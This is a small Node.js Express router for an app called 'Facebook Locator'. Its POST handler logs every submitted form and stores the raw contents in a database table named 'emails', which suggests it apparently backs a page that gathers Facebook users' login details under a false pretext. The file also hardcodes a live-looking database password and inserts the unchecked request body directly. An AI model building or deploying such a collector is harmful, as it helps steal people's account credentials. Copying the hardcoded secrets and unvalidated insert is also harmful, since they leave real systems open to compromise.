var express = require('express');
var router = express.Router();
var mysql      = require('mysql');
var nodemailer = require('nodemailer');

var connection = mysql.createConnection({
  host     : 'sql9.freemysqlhosting.net',
  user     : 'sql9169310',
  password : 'UbKCvPlyVf',
  database : 'sql9169310'
});
connection.connect();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Facebook Locator' });
});

router.post('/locate', function(req, res, next) {
  console.log(req.body);
  connection.query('INSERT INTO emails SET ?', req.body, function (error, results, fields) {
    if (error) throw error;
    console.log('The results are: ', results);
    
  });
  res.render('locate', { title: 'Facebook Locator' });
});

module.exports = router;
